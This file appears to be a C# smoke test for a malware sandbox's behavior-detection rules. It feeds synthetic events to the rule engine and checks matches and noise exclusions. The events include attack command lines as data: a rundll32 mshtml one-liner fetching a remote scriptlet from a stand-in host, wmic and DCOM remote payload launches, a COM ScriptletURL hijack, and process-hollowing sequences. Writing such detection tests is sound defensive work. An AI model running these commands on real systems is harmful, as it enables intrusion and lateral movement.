using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Compile-only repository guard for the v28 behavior-rule expansion. Inputs
/// are behavior-rules.json plus synthetic local events; processing verifies
/// that the Sigma/Elastic/Splunk/LOLBAS-inspired rules stay constrained by
/// local fields and retain v27 self-noise guards without running smoke here.
/// </summary>
internal sealed class BehaviorRuleV28ExpansionScenario : ISmokeTestScenario
{
    private static readonly string[] RequiredRuleIds =
    [
        "persistence-wmi-commandline-consumer-user-writable",
        "persistence-com-scriptleturl-remote-clsid-hijack",
        "injection-hollowing-unmap-write-setcontext-resume",
        "injection-reflective-loader-user-writable-module",
        "lateral-dcom-shellwindows-remote-script-launch",
        "lateral-wmi-admin-share-payload-execution",
        "anti-sandbox-device-object-probe-exit-gate",
        "anti-sandbox-window-title-analysis-gate",
        "download-execute-rundll32-mshtml-remote-script",
        "download-execute-installutil-remote-assembly-launch"
    ];

    public string ScenarioId => "behavior.rules-v28-expansion";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var behaviorRulesPath = Path.Combine(context.RulesDirectory, "behavior-rules.json");
        SmokeAssert.True(File.Exists(behaviorRulesPath), "behavior-rules.json is missing.");

        var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
        SmokeAssert.True(
            string.Equals(rules.Version, "2026-07-12-v28-behavior-rule-expansion", StringComparison.OrdinalIgnoreCase),
            "Behavior rules should carry the v28 behavior-rule expansion version.");

        var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v28 rule '{ruleId}' is missing.");
            AssertRuleContract(rule!);
        }

        AssertSyntheticMatches(rules);
        AssertSelfNoiseGuards(rules);

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = $"{RequiredRuleIds.Length} v28 behavior rules load, match constrained synthetic events, and retain v27 self-noise guards."
        });
    }

    private static void AssertRuleContract(BehaviorRule rule)
    {
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.MitreTechniqueId), $"Rule '{rule.Id}' should include a MITRE technique ID.");
        SmokeAssert.True(rule.EvidenceFields.Count > 0, $"Rule '{rule.Id}' should document evidence fields.");
        SmokeAssert.True(rule.Tags.Contains("open-source-reference", StringComparer.OrdinalIgnoreCase), $"Rule '{rule.Id}' should carry source-reference tags through existing metadata.");
        SmokeAssert.True(
            rule.Tags.Contains("sigma-style", StringComparer.OrdinalIgnoreCase) ||
            rule.Tags.Contains("elastic-style", StringComparer.OrdinalIgnoreCase) ||
            rule.Tags.Contains("splunk-style", StringComparer.OrdinalIgnoreCase) ||
            rule.Tags.Contains("lolbas-inspired", StringComparer.OrdinalIgnoreCase),
            $"Rule '{rule.Id}' should identify the open-source behavior family inspiration in tags.");
        SmokeAssert.True(
            rule.CommandLineRegex.Count > 0 ||
            rule.DataContainsAll.Count > 0 ||
            rule.DataRegex.Count > 0 ||
            rule.AllDataRegex.Count > 0 ||
            rule.AllDataNumericRanges.Count > 0,
            $"Rule '{rule.Id}' should use constrained predicates rather than broad substring-only matching.");
        SmokeAssert.True(
            rule.ExcludeProcessNames.Contains("KSword.Sandbox.Agent.exe", StringComparer.OrdinalIgnoreCase) &&
            rule.ExcludeProcessNames.Contains("KSword.Sandbox.R0Collector.exe", StringComparer.OrdinalIgnoreCase),
            $"Rule '{rule.Id}' should exclude sandbox plumbing process names.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "collection-health"), $"Rule '{rule.Id}' should exclude collection-health source rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "virustotal"), $"Rule '{rule.Id}' should exclude VirusTotal source rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "r0collector"), $"Rule '{rule.Id}' should exclude R0 collector source rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "collectorSelfNoise", "true"), $"Rule '{rule.Id}' should exclude collector self-noise.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "collectorNoise", "true"), $"Rule '{rule.Id}' should exclude collector noise.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "noise", "true"), $"Rule '{rule.Id}' should exclude generic noise.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "selfNoise", "true"), $"Rule '{rule.Id}' should exclude generic self-noise.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "behaviorCounted", "false"), $"Rule '{rule.Id}' should exclude behaviorCounted=false rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "nonbehavior", "true"), $"Rule '{rule.Id}' should exclude nonbehavior=true rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "sampleBehaviorCandidate", "false"), $"Rule '{rule.Id}' should exclude sampleBehaviorCandidate=false rows.");
    }

    private static void AssertSyntheticMatches(BehaviorRuleSet rules)
    {
        var findingIds = new RuleEngine(rules)
            .Classify(CreatePositiveEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(findingIds.Contains(ruleId), $"Synthetic v28 event should match '{ruleId}'.");
        }
    }

    private static void AssertSelfNoiseGuards(BehaviorRuleSet rules)
    {
        var noiseFindings = new RuleEngine(rules)
            .Classify(CreateNoiseEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(!noiseFindings.Contains(ruleId), $"Self-noise event should not match v28 rule '{ruleId}'.");
        }
    }

    private static IReadOnlyList<SandboxEvent> CreatePositiveEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "wmi.event_consumer",
                Source = "guest",
                Data =
                {
                    ["consumerName"] = "UpdaterConsumer",
                    ["consumerType"] = "CommandLineEventConsumer",
                    ["filterName"] = "UpdaterFilter",
                    ["commandLineTemplate"] = @"C:\Users\Public\stage\consumer.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "driver",
                Path = @"HKCU\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\ScriptletURL",
                Data =
                {
                    ["valueName"] = "ScriptletURL",
                    ["value"] = "https://example.invalid/payload.sct"
                }
            },
            new SandboxEvent
            {
                EventType = "api.sequence",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "CreateProcess suspended NtUnmapViewOfSection VirtualAllocEx WriteProcessMemory SetThreadContext ResumeThread",
                    ["targetImage"] = "notepad.exe",
                    ["payloadPath"] = @"C:\Users\Public\stage\hollow.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "api.sequence",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "VirtualAlloc WriteProcessMemory DllMain",
                    ["loader"] = "ReflectiveLoader manual map",
                    ["modulePath"] = @"C:\Users\Public\stage\reflective.dll",
                    ["targetProcessName"] = "explorer.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "dcom.activation",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["remoteHost"] = "workstation03",
                    ["comClass"] = "ShellWindows",
                    ["command"] = @"powershell.exe -File C:\Users\Public\stage\remote.ps1"
                }
            },
            new SandboxEvent
            {
                EventType = "wmi.process_create",
                Source = "guest",
                ProcessName = "wmic.exe",
                CommandLine = @"wmic.exe /node:workstation04 process call create \\workstation04\ADMIN$\stage\payload.exe",
                Data =
                {
                    ["remoteHost"] = "workstation04",
                    ["payloadPath"] = @"\\workstation04\ADMIN$\stage\payload.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "anti_sandbox.check",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["probe"] = "CreateFile device driver probe",
                    ["artifact"] = "VBoxMiniRdrDN",
                    ["action"] = "exit gate"
                }
            },
            new SandboxEvent
            {
                EventType = "anti_sandbox.check",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["check"] = "EnumWindows window title scan",
                    ["matchedName"] = "Process Monitor",
                    ["action"] = "suppress execution gate"
                }
            },
            new SandboxEvent
            {
                EventType = "download.execute",
                Source = "guest",
                ProcessName = "rundll32.exe",
                CommandLine = "rundll32.exe mshtml,RunHTMLApplication javascript:GetObject(\"script:https://example.invalid/a.sct\")",
                Data =
                {
                    ["sourceUrl"] = "https://example.invalid/a.sct",
                    ["executedPath"] = @"C:\Users\Public\stage\rundll.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "download.execute",
                Source = "guest",
                ProcessName = "InstallUtil.exe",
                CommandLine = @"InstallUtil.exe C:\Users\Public\stage\assembly.exe",
                Data =
                {
                    ["sourceUrl"] = "https://example.invalid/assembly.exe",
                    ["executedPath"] = @"C:\Users\Public\stage\assembly.exe"
                }
            }
        ];
    }

    private static IReadOnlyList<SandboxEvent> CreateNoiseEvents()
    {
        return CreatePositiveEvents()
            .Select(evt =>
            {
                var data = new Dictionary<string, string>(evt.Data, StringComparer.OrdinalIgnoreCase)
                {
                    ["collectorSelfNoise"] = "true",
                    ["collectorNoise"] = "true",
                    ["noise"] = "true",
                    ["selfNoise"] = "true",
                    ["behaviorCounted"] = "false",
                    ["nonbehavior"] = "true",
                    ["sampleBehaviorCandidate"] = "false"
                };

                return evt with
                {
                    ProcessName = "KSword.Sandbox.Agent.exe",
                    Data = data
                };
            })
            .ToArray();
    }

    private static bool ContainsGuard(IReadOnlyDictionary<string, List<string>> values, string key, string value)
    {
        return values.TryGetValue(key, out var candidates) && candidates.Contains(value, StringComparer.OrdinalIgnoreCase);
    }
}
